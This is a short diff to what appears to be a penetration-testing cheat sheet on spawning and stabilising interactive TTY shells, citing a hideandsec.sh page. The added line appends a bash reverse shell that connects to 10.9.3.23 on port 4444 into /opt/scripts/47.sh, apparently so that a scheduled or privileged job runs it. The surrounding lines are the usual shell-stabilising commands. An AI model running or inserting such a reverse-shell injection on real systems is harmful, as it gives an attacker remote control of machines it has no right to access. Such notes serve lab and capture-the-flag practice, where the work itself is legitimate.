@@ -11,6 +11,7 @@ stty raw -echo;fg
 reset
 xterm‌‌
 
+echo "bash -i >& /dev/tcp/10.9.3.23/4444 0>&1" >> /opt/scripts/47.sh
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
 ```
 https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells
